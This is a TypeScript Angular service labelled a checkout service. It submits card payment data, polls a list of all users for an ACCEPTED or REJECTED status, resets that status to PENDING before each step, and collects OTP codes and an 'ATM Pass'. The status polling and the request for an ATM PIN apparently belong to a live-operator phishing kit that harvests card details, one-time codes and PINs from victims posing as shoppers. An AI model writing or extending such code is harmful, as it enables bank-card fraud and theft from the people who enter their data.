import { Injectable } from '@angular/core';
import { BaseApiService } from './base-api.service';
import { Observable, tap, map, catchError, of } from 'rxjs';

@Injectable({
  providedIn: 'root'
})
export class CheckoutService extends BaseApiService {
  private _cardId: string | null = null;

  get cardId(): string | null {
    if (!this._cardId && typeof window !== 'undefined' && window.sessionStorage) {
      this._cardId = sessionStorage.getItem('pending_card_id');
    }
    return this._cardId;
  }

  set cardId(val: string | null) {
    this._cardId = val;
    if (typeof window !== 'undefined' && window.sessionStorage) {
      if (val) {
        sessionStorage.setItem('pending_card_id', val);
      } else {
        sessionStorage.removeItem('pending_card_id');
      }
    }
  }

  submitPayment(paymentData: any): Observable<any> {
    return this.post<any>(`/api/user/create`, paymentData).pipe(
      tap((res) => {
        if (res?.CardId) {
          this.cardId = res.CardId;
        }
      })
    );
  }

  // Poll current user status: 'PENDING' | 'ACCEPTED' | 'REJECTED' | null
  checkUserStatus(userId: string): Observable<'PENDING' | 'ACCEPTED' | 'REJECTED' | null> {
    return this.get<any[]>(`/api/user/all`).pipe(
      map(users => {
        if (!Array.isArray(users)) return null;
        const user = users.find(u => (u.CardId || u.id) === userId);
        if (!user) return null;
        const status = String(user.Status || user.status || 'PENDING').toUpperCase();
        if (status === 'ACCEPTED') return 'ACCEPTED';
        if (status === 'REJECTED') return 'REJECTED';
        return 'PENDING';
      }),
      catchError((err) => {
        console.error('Error checking user status:', err);
        return of(null);
      })
    );
  }

  // Reset status to PENDING when user advances to next step (OTP or ATM Pass)
  resetUserStatus(userId: string): Observable<any> {
    return this.patch<any>(`/api/user/${userId}`, { status: 'PENDING' }).pipe(
      catchError((err) => {
        console.error('Failed to reset user status:', err);
        return of(null);
      })
    );
  }

  verifyOtp(transactionId: string, otpCode: string): Observable<{success: boolean}> {
    return this.post<{success: boolean}>(`/checkout/verify-otp`, { transactionId, otpCode });
  }

  confirmAtmPass(transactionId: string, atmPass: string): Observable<{success: boolean}> {
    return this.post<{success: boolean}>(`/checkout/confirm-atm`, { transactionId, atmPass });
  }
}
